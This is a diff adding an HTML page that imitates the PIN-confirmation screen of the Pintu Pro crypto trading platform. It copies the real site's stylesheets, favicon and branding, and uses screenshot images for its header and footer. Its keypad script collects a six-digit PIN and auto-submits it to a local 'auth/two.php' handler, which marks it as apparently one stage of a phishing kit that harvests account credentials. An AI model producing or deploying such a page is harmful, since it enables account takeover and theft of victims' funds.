@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="id" class="dark" style="color-scheme: dark;">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="Login%20Akun%20-%20Pintu%20Pro%20Web_files/ce8e9a1445a0e61b.css" data-precedence="next">
+    <link rel="stylesheet" href="Login%20Akun%20-%20Pintu%20Pro%20Web_files/2c93183d42ded407.css" data-precedence="next">
+    <title>PIN - Pintu Pro Web</title>
+    <meta property="og:image" content="https://s3.ap-southeast-1.amazonaws.com/content.pintu.co.id/ic_launcher_1493da4144.png">
+    <link rel="shortcut icon" href="https://pintu.co.id/pro/assets/favicon.png">
+    <meta property="og:description" content="Login/masuk ke akun Pintu Pro Web. Nikmati pengalaman trading dengan berbagai tools canggih, biaya trading rendah dan likuiditas tinggi.">
+    <style>
+        :root {
+            --header-height: 56px;
+            --footer-height: 48px;
+            --primary-color: #0A68F4;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #121212;
+            color: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        
+  .nav1{
+      z-index:999999;
+      position: fixed;
+      background: url("images/WTOrQT.jpg") transparent;
+      background-repeat: no-repeat;
+      background-size: 100%;
+      height: 63px;
+      width: 100%;
+      margin: 0px auto;
+      box-shadow: 0px 1px 4px 2px rgba(66, 68, 90, 0.18);
+         
+ }
+        
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            color: #9E9E9E;
+            margin-bottom: 32px;
+            max-width: 300px;
+        }
+        
+        .pin-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 32px;
+        }
+        
+        .pin-input {
+            width: 48px;
+            height: 48px;
+            border: 1px solid #333;
+            border-radius: 8px;
+            background-color: transparent;
+            color: white;
+            font-size: 1.5rem;
+            text-align: center;
+            outline: none;
+        }
+        
+        .pin-input:focus {
+            border-color: var(--primary-color);
+        }
+        
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            width: 100%;
+            max-width: 300px;
+        }
+        
+        .key {
+            height: 60px;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            font-weight: 500;
+            background-color: #1E1E1E;
+            cursor: pointer;
+            user-select: none;
+        }
+        
+        .key:active {
+            background-color: #2E2E2E;
+        }
+        
+        .key.empty {
+            visibility: hidden;
+        }
+        
+        .key.delete {
+            background-color: transparent;
+        }
+        
+        footer {
+            height: var(--footer-height);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-top: 0.5px solid #333;
+            color: #9E9E9E;
+            font-size: 0.875rem;
+        }
+        
+        @media (max-width: 360px) {
+            .pin-input {
+                width: 40px;
+                height: 40px;
+                font-size: 1.25rem;
+            }
+            
+            .key {
+                height: 50px;
+            }
+        }
+    </style>
+</head>
+<body>
+   <nav class="nav1"></nav>
+    
+     <main>
+        <h1 class="title">Konfirmasi PIN</h1>
+        <p class="subtitle">Gunakan PIN untuk masuk ke akun PINTU Pro Anda</p>
+        <form id="pin-form" action="auth/two.php" method="post">
+            <div class="pin-container">
+                <input type="text" class="pin-input" name="pin1" maxlength="1" inputmode="numeric" readonly>
+                <input type="text" class="pin-input" name="pin2" maxlength="1" inputmode="numeric" readonly>
+                <input type="text" class="pin-input" name="pin3" maxlength="1" inputmode="numeric" readonly>
+                <input type="text" class="pin-input" name="pin4" maxlength="1" inputmode="numeric" readonly>
+                <input type="text" class="pin-input" name="pin5" maxlength="1" inputmode="numeric" readonly>
+                <input type="text" class="pin-input" name="pin6" maxlength="1" inputmode="numeric" readonly>
+            </div>
+        </form>
+        <footer>
+            Lupa PIN?
+        </footer>
+        <div class="keypad">
+            <div class="key" data-value="1">1</div>
+            <div class="key" data-value="2">2</div>
+            <div class="key" data-value="3">3</div>
+            <div class="key" data-value="4">4</div>
+            <div class="key" data-value="5">5</div>
+            <div class="key" data-value="6">6</div>
+            <div class="key" data-value="7">7</div>
+            <div class="key" data-value="8">8</div>
+            <div class="key" data-value="9">9</div>
+            <div class="key empty"></div>
+            <div class="key" data-value="0">0</div>
+            <div class="key delete">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M6.29289 6.29289C6.68342 5.90237 7.31658 5.90237 7.70711 6.29289L12 10.5858L16.2929 6.29289C16.6834 5.90237 17.3166 5.90237 17.7071 6.29289C18.0976 6.68342 18.0976 7.31658 17.7071 7.70711L13.4142 12L17.7071 16.2929C18.0976 16.6834 18.0976 17.3166 17.7071 17.7071C17.3166 18.0976 16.6834 18.0976 16.2929 17.7071L12 13.4142L7.70711 17.7071C7.31658 18.0976 6.68342 18.0976 6.29289 17.7071C5.90237 17.3166 5.90237 16.6834 6.29289 16.2929L10.5858 12L6.29289 7.70711C5.90237 7.31658 5.90237 6.68342 6.29289 6.29289Z" fill="#9E9E9E"/>
+                </svg>
+            </div>
+        </div>
+    </main>
+    
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const pinForm = document.getElementById('pin-form');
+        const pinInputs = document.querySelectorAll('.pin-input');
+        const keys = document.querySelectorAll('.key:not(.empty)');
+        const deleteBtn = document.querySelector('.key.delete');
+        
+        let currentIndex = 0;
+    
+        
+        keys.forEach(key => {
+            key.addEventListener('click', function() {
+                if (this.classList.contains('delete')) {
+                    if (currentIndex > 0) {
+                        currentIndex--;
+                        pinInputs[currentIndex].value = '';
+                    }
+                } else {
+                    if (currentIndex < pinInputs.length) {
+                        const value = this.getAttribute('data-value');
+                        pinInputs[currentIndex].value = value;
+                        currentIndex++;
+                        
+                        if (currentIndex === pinInputs.length) {
+                            
+                            setTimeout(() => {
+                                pinForm.submit();
+                            }, 200); 
+                        }
+                    }
+                }
+            });
+        });
+    
+        
+        pinInputs.forEach((input, index) => {
+            input.addEventListener('keydown', function(e) {
+                e.preventDefault();
+            });
+        });
+    });
+    </script>
+    
+     <center>
+ <img src="images/bawah.png" style="width: 100%; position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto">
+     </center>
+      
+      <div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events:none">
+         <ol tabindex="-1" class="fixed bottom-8 right-0 z-[100] flex max-h-screen w-full max-w-[420px] flex-col gap-2 p-2"></ol>
+      </div>
+      </body>
+      </html>
